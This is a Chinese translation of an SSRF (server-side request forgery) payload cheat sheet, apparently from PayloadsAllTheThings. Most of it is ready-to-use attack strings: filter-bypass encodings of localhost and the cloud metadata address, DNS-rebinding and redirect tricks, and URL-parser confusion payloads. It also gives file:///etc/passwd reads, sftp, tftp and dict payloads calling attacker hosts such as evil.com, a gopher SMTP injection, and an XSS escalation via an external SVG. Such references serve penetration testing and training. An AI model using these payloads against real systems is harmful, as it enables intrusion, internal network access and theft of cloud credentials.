[原文文档](README.en.md)

# 服务器端请求伪造

> 服务器端请求伪造（Server Side Request Forgery，SSRF）是一种漏洞，攻击者能够强制服务器代表其执行请求。

## 概述

* [工具](#工具)
* [方法论](#方法论)
* [绕过过滤器](#绕过过滤器)
    * [默认目标](#默认目标)
    * [使用IPv6表示法绕过localhost](#使用ipv6表示法绕过localhost)
    * [使用域名重定向绕过localhost](#使用域名重定向绕过localhost)
    * [使用CIDR绕过localhost](#使用cidr绕过localhost)
    * [使用稀有地址绕过](#使用稀有地址绕过)
    * [使用编码IP地址绕过](#使用编码ip地址绕过)
    * [使用不同编码绕过](#使用不同编码绕过)
    * [通过重定向绕过](#通过重定向绕过)
    * [使用DNS重绑定绕过](#使用dns重绑定绕过)
    * [滥用URL解析差异绕过](#滥用url解析差异绕过)
    * [绕过PHP filter_var()函数](#绕过php-filter_var函数)
    * [使用JAR方案绕过](#使用jar方案绕过)
* [通过URL方案利用](#通过url方案利用)
    * [file://](#file)
    * [http://](#http)
    * [dict://](#dict)
    * [sftp://](#sftp)
    * [tftp://](#tftp)
    * [ldap://](#ldap)
    * [gopher://](#gopher)
    * [netdoc://](#netdoc)
* [盲利用](#盲利用)
* [升级到XSS](#升级到xss)
* [实验环境](#实验环境)
* [参考资料](#参考资料)

## 工具

* [swisskyrepo/SSRFmap](https://github.com/swisskyrepo/SSRFmap) - 自动SSRF模糊测试和利用工具
* [tarunkant/Gopherus](https://github.com/tarunkant/Gopherus) - 生成gopher链接用于利用SSRF并在各种服务器中获取RCE
* [In3tinct/See-SURF](https://github.com/In3tinct/See-SURF) - 基于Python的扫描器，用于查找潜在的SSRF参数
* [teknogeek/SSRF-Sheriff](https://github.com/teknogeek/ssrf-sheriff) - 用Go编写的简单SSRF测试工具
* [assetnote/surf](https://github.com/assetnote/surf) - 返回可行的SSRF候选列表
* [dwisiswant0/ipfuscator](https://github.com/dwisiswant0/ipfuscator) - 快速、安全、线程安全且零内存分配的工具，用于快速生成IPv4地址的替代表示形式
* [Horlad/r3dir](https://github.com/Horlad/r3dir) - 重定向服务旨在帮助绕过不验证重定向位置的SSRF过滤器。借助Hackvertor标签与Burp集成

## 方法论

SSRF是一种安全漏洞，当攻击者操纵服务器向意外位置发送HTTP请求时会发生这种情况。当服务器在未经适当验证的情况下处理用户提供的URL或IP地址时，就会发生这种情况。

常见的利用路径：

* 访问云元数据
* 泄露服务器上的文件
* 网络发现，使用SSRF进行端口扫描
* 向网络上的特定服务发送数据包，通常是为了在另一台服务器上实现远程命令执行

**示例**：服务器接受用户输入来获取URL。

```py
url = input("输入URL:")
response = requests.get(url)
return response
```

攻击者提供恶意输入：

```ps1
http://169.254.169.254/latest/meta-data/
```

这将从AWS EC2元数据服务获取敏感信息。

## 绕过过滤器

### 默认目标

默认情况下，服务器端请求伪造用于访问托管在`localhost`或网络上更隐藏位置的服务。

* 使用`localhost`

  ```powershell
  http://localhost:80
  http://localhost:22
  https://localhost:443
  ```

* 使用`127.0.0.1`

  ```powershell
  http://127.0.0.1:80
  http://127.0.0.1:22
  https://127.0.0.1:443
  ```

* 使用`0.0.0.0`

  ```powershell
  http://0.0.0.0:80
  http://0.0.0.0:22
  https://0.0.0.0:443
  ```

### 使用IPv6表示法绕过localhost

* 使用IPv6中未指定的地址`[::]`

    ```powershell
    http://[::]:80/
    ```

* 使用IPv6环回地址`[0000::1]`

    ```powershell
    http://[0000::1]:80/
    ```

* 使用[IPv6/IPv4地址嵌入](http://www.tcpipguide.com/free/t_IPv6IPv4AddressEmbedding.htm)

    ```powershell
    http://[0:0:0:0:0:ffff:127.0.0.1]
    http://[::ffff:127.0.0.1]
    ```

### 使用域名重定向绕过localhost

| 域名                       | 重定向到 |
|----------------------------|----------|
| localtest.me               | `::1`       |
| localh.st                    | `127.0.0.1` |
| spoofed.[BURP_COLLABORATOR]  | `127.0.0.1` |
| spoofed.redacted.oastify.com | `127.0.0.1` |
| company.127.0.0.1.nip.io     | `127.0.0.1` |

`nip.io`服务非常棒，它会将任何IP地址转换为DNS。

```powershell
NIP.IO将<anything>.<IP Address>.nip.io映射到相应的<IP Address>，甚至127.0.0.1.nip.io也映射到127.0.0.1
```

### 使用CIDR绕过localhost

IPv4中的IP地址范围`127.0.0.0/8`是为环回地址保留的。

```powershell
http://127.127.127.127
http://127.0.1.3
http://127.0.0.0
```

如果你尝试在网络中使用此范围内的任何地址（127.0.0.2、127.1.1.1等），它仍将解析到本地机器

### 使用稀有地址绕过

你可以通过删除零来简写IP地址

```powershell
http://0/
http://127.1
http://127.0.1
```

### 使用编码IP地址绕过

* 十进制IP位置

    ```powershell
    http://2130706433/ = http://127.0.0.1
    http://3232235521/ = http://192.168.0.1
    http://3232235777/ = http://192.168.1.1
    http://2852039166/ = http://169.254.169.254
    ```

* 八进制IP：实现对如何处理IPv4八进制格式有所不同。

    ```powershell
    http://0177.0.0.1/ = http://127.0.0.1
    http://o177.0.0.1/ = http://127.0.0.1
    http://0o177.0.0.1/ = http://127.0.0.1
    http://q177.0.0.1/ = http://127.0.0.1
    ```

* 十六进制IP

    ```powershell
    http://0x7f000001 = http://127.0.0.1
    http://0xc0a80101 = http://192.168.1.1
    http://0xa9fea9fe = http://169.254.169.254
    ```

### 使用不同编码绕过

* URL编码：对特定URL进行单次或双重编码以绕过黑名单

    ```powershell
    http://127.0.0.1/%61dmin
    http://127.0.0.1/%2561dmin
    ```

* 封闭字母数字：`①②③④⑤⑥⑦⑧⑨⑩⑪⑫⑬⑭⑮⑯⑰⑱⑲⑳⑴⑵⑶⑷⑸⑹⑺⑻⑼⑽⑾⑿⒀⒁⒂⒃⒄⒅⒆⒇⒈⒉⒊⒋⒌⒍⒎⒏⒐⒑⒒⒓⒔⒕⒖⒗⒘⒙⒚⒛⒜⒝⒞⒟⒠⒡⒢⒣⒤⒥⒦⒧⒨⒩⒪⒫⒬⒭⒮⒯⒰⒱⒲⒳⒴⒵ⒶⒷⒸⒹⒺⒻⒼⒽⒾⒿⓀⓁⓂⓃⓄⓅⓆⓇⓈⓉⓊⓋⓌⓍⓎⓏⓐⓑⓒⓓⓔⓕⓖⓗⓘⓙⓚⓛⓜⓝⓞⓟⓠⓡⓢⓣⓤⓥⓦⓧⓨⓩ⓪⓫⓬⓭⓮⓯⓰⓱⓲⓳⓴⓵⓶⓷⓸⓹⓺⓻⓼⓽⓾⓿`

    ```powershell
    http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ = example.com
    ```

* Unicode编码：在某些语言（.NET、Python 3）中，regex默认支持unicode。`\d`包含`0123456789`但也包含`๐๑๒๓๔๕๖๗๘๙`。

### 通过IPv6主机名绕过

* Linux /etc/hosts包含此行`::1   localhost ip6-localhost ip6-loopback`，但仅在HTTP服务器在IPv6上运行时有效

   ```powershell
   http://ip6-localhost = ::1
   http://ip6-loopback = ::1
   ```

### 通过重定向绕过

1. 在白名单主机上创建一个页面，将请求重定向到SSRF目标URL（例如192.168.0.1）
2. 启动指向`vulnerable.com/index.php?url=http://redirect-server`的SSRF
3. 你可以使用响应码[HTTP 307](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/307)和[HTTP 308](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/308)来在重定向后保留HTTP方法和正文。

要执行重定向而不托管自己的重定向服务器或执行无缝重定向目标模糊测试，请使用[Horlad/r3dir](https://github.com/Horlad/r3dir)。

* 使用`307 Temporary Redirect`状态码重定向到`http://localhost`

    ```powershell
    https://307.r3dir.me/--to/?url=http://localhost
    ```

* 使用`302 Found`状态码重定向到`http://169.254.169.254/latest/meta-data/`

    ```powershell
    https://62epax5fhvj3zzmzigyoe5ipkbn7fysllvges3a.302.r3dir.me
    ```

### 使用DNS重绑定绕过

创建一个在两个IP之间变化的域名。

* [1u.ms](http://1u.ms) - DNS重绑定实用工具

例如在`1.2.3.4`和`169.254-169.254`之间轮换，使用以下域名：

```powershell
make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
```

使用`nslookup`验证地址。

```ps1
$ nslookup make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
Name:   make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
Address: 1.2.3.4

$ nslookup make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
Name:   make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
Address: 169.254.169.254
```

### 滥用URL解析差异绕过

[新一代SSRF：利用流行编程语言中的URL解析器 - 蔡橙的研究](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf)

```powershell
http://127.1.1.1:80\@127.2.2.2:80/
http://127.1.1.1:80\@@127.2.2.2:80/
http://127.1.1.1:80:\@@127.2.2.2:80/
http://127.1.1.1:80#\@127.2.2.2:80/
```

![https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/Images/WeakParser.png?raw=true](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/Images/WeakParser.jpg?raw=true)

不同库的解析行为：`http://1.1.1.1 &@2.2.2.2# @3.3.3.3/`

* `urllib2`将`1.1.1.1`视为目标
* `requests`和浏览器重定向到`2.2.2.2`
* `urllib`解析为`3.3.3.3`

### 绕过PHP filter_var()函数

在PHP 7.0.25中，`filter_var()`函数使用`FILTER_VALIDATE_URL`参数允许以下URL：

* `http://test???test.com`
* `0://evil.com:80;http://google.com:80/`

```php
<?php 
 echo var_dump(filter_var("http://test???test.com", FILTER_VALIDATE_URL));
 echo var_dump(filter_var("0://evil.com;google.com", FILTER_VALIDATE_URL));
?>
```

### 使用JAR方案绕过

这种攻击技术完全盲目，你不会看到结果。

```powershell
jar:scheme://domain/path!/ 
jar:http://127.0.0.1!/
jar:https://127.0.0.1!/
jar:ftp://127.0.0.1!/
```

## 通过URL方案利用

### File

允许攻击者获取服务器上文件的内容。将SSRF转换为文件读取。

```powershell
file:///etc/passwd
file://\/\/etc/passwd
```

### HTTP

允许攻击者从Web获取任何内容，也可以用于扫描端口。

```powershell
ssrf.php?url=http://127.0.0.1:22
ssrf.php?url=http://127.0.0.1:80
ssrf.php?url=http://127.0.0.1:443
```

![SSRF流](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/Images/SSRF_stream.png?raw=true)

### Dict

DICT URL方案用于引用使用DICT协议可用的定义或单词列表：

```powershell
dict://<user>;<auth>@<host>:<port>/d:<word>:<database>:<n>
ssrf.php?url=dict://attacker:11111/
```

### SFTP

用于通过安全shell进行安全文件传输的网络协议

```powershell
ssrf.php?url=sftp://evil.com:11111/
```

### TFTP

简单文件传输协议，工作在UDP上

```powershell
ssrf.php?url=tftp://evil.com:12346/TESTUDPPACKET
```

### LDAP

轻量级目录访问协议。它是一个在IP网络上用于管理和访问分布式目录信息服务的应用程序协议。

```powershell
ssrf.php?url=ldap://localhost:11211/%0astats%0aquit
```

### Netdoc

当你的负载在处理"`\n`"和"`\r`"字符时遇到困难时的Java包装器。

```powershell
ssrf.php?url=netdoc:///etc/passwd
```

### Gopher

`gopher://`协议是一种轻量级、基于文本的协议，早于现代万维网。它旨在通过Internet分发、搜索和检索文档。

```ps1
gopher://[host]:[port]/[type][selector]
```

这个方案非常有用，因为它可以用于向TCP协议发送数据。

```ps1
gopher://localhost:25/_MAIL%20FROM:<attacker@example.com>%0D%0A
```

参考SSRF高级利用以更深入地探索`gopher://`协议。

## 盲利用

> 当利用服务器端请求伪造时，我们经常发现自己处于无法读取响应的位置。

使用SSRF链获取带外输出：[assetnote/blind-ssrf-chains](https://github.com/assetnote/blind-ssrf-chains)

**可能通过HTTP(s)实现**：

* [Elasticsearch](https://github.com/assetnote/blind-ssrf-chains#elasticsearch)
* [Weblogic](https://github.com/assetnote/blind-ssrf-chains#weblogic)
* [Hashicorp Consul](https://github.com/assetnote/blind-ssrf-chains#consul)
* [Shellshock](https://github.com/assetnote/blind-ssrf-chains#shellshock)
* [Apache Druid](https://github.com/assetnote/blind-ssrf-chains#druid)
* [Apache Solr](https://github.com/assetnote/blind-ssrf-chains#solr)
* [PeopleSoft](https://github.com/assetnote/blind-ssrf-chains#peoplesoft)
* [Apache Struts](https://github.com/assetnote/blind-ssrf-chains#struts)
* [JBoss](https://github.com/assetnote/blind-ssrf-chains#jboss)
* [Confluence](https://github.com/assetnote/blind-ssrf-chains#confluence)
* [Jira](https://github.com/assetnote/blind-ssrf-chains#jira)
* [其他Atlassian产品](https://github.com/assetnote/blind-ssrf-chains#atlassian-products)
* [OpenTSDB](https://github.com/assetnote/blind-ssrf-chains#opentsdb)
* [Jenkins](https://github.com/assetnote/blind-ssrf-chains#jenkins)
* [Hystrix Dashboard](https://github.com/assetnote/blind-ssrf-chains#hystrix)
* [W3 Total Cache](https://github.com/assetnote/blind-ssrf-chains#w3)
* [Docker](https://github.com/assetnote/blind-ssrf-chains#docker)
* [Gitlab Prometheus Redis Exporter](https://github.com/assetnote/blind-ssrf-chains#redisexporter)

**可能通过Gopher实现**：

* [Redis](https://github.com/assetnote/blind-ssrf-chains#redis)
* [Memcache](https://github.com/assetnote/blind-ssrf-chains#memcache)
* [Apache Tomcat](https://github.com/assetnote/blind-ssrf-chains#tomcat)

## 升级到XSS

当SSRF没有任何关键影响，网络被分段且你无法到达其他机器时，SSRF不允许你从服务器中泄露文件。

你可以尝试将SSRF升级到XSS，通过包含包含JavaScript代码的SVG文件。

```bash
https://example.com/ssrf.php?url=http://brutelogic.com.br/poc.svg
```

## 实验环境

* [PortSwigger - 针对本地服务器的基本SSRF](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost)
* [PortSwigger - 针对另一个后端系统的基本SSRF](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system)
* [PortSwigger - 具有基于黑名单输入过滤器的SSRF](https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter)
* [PortSwigger - 具有基于白名单输入过滤器的SSRF](https://portswigger.net/web-security/ssrf/lab-ssrf-with-whitelist-filter)
* [PortSwigger - 通过开放重定向漏洞绕过过滤器的SSRF](https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection)
* [Root Me - 服务器端请求伪造](https://www.root-me.org/en/Challenges/Web-Server/Server-Side-Request-Forgery)
* [Root Me - Nginx - SSRF配置错误](https://www.root-me.org/en/Challenges/Web-Server/Nginx-SSRF-Misconfiguration)

## 参考资料

* [新一代SSRF：利用URL解析器 - 蔡橙 - 2017年9月27日](https://www.youtube.com/watch?v=D1S-G8rJrEk)
* [errors.hackerone.net上的盲SSRF - chaosbolt - 2018年6月30日](https://hackerone.com/reports/374737)
* [ESEA服务器端请求伪造和查询AWS元数据 - Brett Buerhaus - 2016年4月18日](http://buer.haus/2016/04/18/esea-server-side-request-forgery-and-querying-aws-meta-data/)
* [Hacker101 SSRF - Cody Brocious - 2018年10月29日](https://www.youtube.com/watch?v=66ni2BTIjS8)
* [Hackerone - 如何：服务器端请求伪造（SSRF） - Jobert Abma - 2017年6月14日](https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF)
* [黑客攻击黑客：在HackerTarget中利用SSRF - @sxcurity - 2017年12月17日](http://web.archive.org/web/20171220083457/http://www.sxcurity.pro/2017/12/17/hackertarget/)
* [我是如何在GitHub Enterprise上链接4个漏洞，从SSRF执行链到RCE！ - 蔡橙 - 2017年7月28日](http://blog.orange.tw/2017/07/how-i-chained-4-vulnerabilities-on.html)
* [Les Server Side Request Forgery : Comment contourner un pare-feu - Geluchat - 2017年9月16日](https://www.dailysecurity.fr/server-side-request-forgery/)
* [PHP SSRF - @secjuice - theMiddle - 2018年3月1日](https://medium.com/secjuice/php-ssrf-techniques-9d422cb28d51)
* [刺穿面纱：服务器端请求伪造到NIPRNet访问 - Alyssa Herrera - 2018年4月9日](https://medium.com/bugbountywriteup/piercing-the-veil-server-side-request-forgery-to-niprnet-access-c358fd5e249a)
* [服务器端浏览被认为是有害的 - Nicolas Grégoire (Agarri) - 2015年5月21日](https://www.agarri.fr/docs/AppSecEU15-Server_side_browsing_considered_harmful.pdf)
* [SSRF - 服务器端请求伪造（类型和利用方式）第一部分 - SaN ThosH (madrobot) - 2019年1月10日](https://medium.com/@madrobot/ssrf-server-side-request-forgery-types-and-ways-to-exploit-it-part-1-29d034c27978)
* [视频到GIF转换器中的SSRF和本地文件读取 - sl1m - 2016年2月11日](https://hackerone.com/reports/115857)
* [https://imgur.com/vidgif/url中的SSRF - Eugene Farfel (aesteral) - 2016年2月10日](https://hackerone.com/reports/115748)
* [proxy.duckduckgo.com中的SSRF - Patrik Fábián (fpatrik) - 2018年5月27日](https://hackerone.com/reports/358119)
* [*shopifycloud.com上的SSRF - Rojan Rijal (rijalrojan) - 2018年7月17日](https://hackerone.com/reports/382612)
* [纯文本凭据处理程序中的SSRF协议走私：LDAP - Willis Vandevanter (@0xrst) - 2019年2月5日](https://www.silentrobots.com/ssrf-protocol-smuggling-in-plaintext-credential-handlers-ldap/)
* [SSRF技巧 - xl7dev - 2016年7月3日](http://web.archive.org/web/20170407053309/http://blog.safebuff.com/2016/07/03/SSRF-Tips/)
* [SSRF的崛起！现实世界中的服务器端请求伪造（SSRF） - Alberto Wilson和Guillermo Gabarrin - 2019年1月25日](https://www.shorebreaksecurity.com/blog/ssrfs-up-real-world-server-side-request-forgery-ssrf/)
* [使用SSRF脆弱性攻击GCE/GKE实例的例子 - mrtc0 - 2018年9月5日](https://blog.ssrf.in/post/example-of-attack-on-gce-and-gke-instance-using-ssrf-vulnerability/)
* [SVG SSRF备忘单 - Allan Wirth (@allanlw) - 2019年6月12日](https://github.com/allanlw/svg-cheatsheet)
* [Java中的URL特殊性 - sammy (@PwnL0rd) - 2020年11月2日](http://web.archive.org/web/20201107113541/https://blog.pwnl0rd.me/post/lfi-netdoc-file-java/)
* [Web安全学院服务器端请求伪造（SSRF） - PortSwigger - 2019年7月10日](https://portswigger.net/web-security/ssrf)
* [X-CTF决赛2016 - John Slick（Web 25） - YEO QUAN YANG (@quanyang) - 2016年6月22日](https://quanyang.github.io/x-ctf-finals-2016-john-slick-web-25/)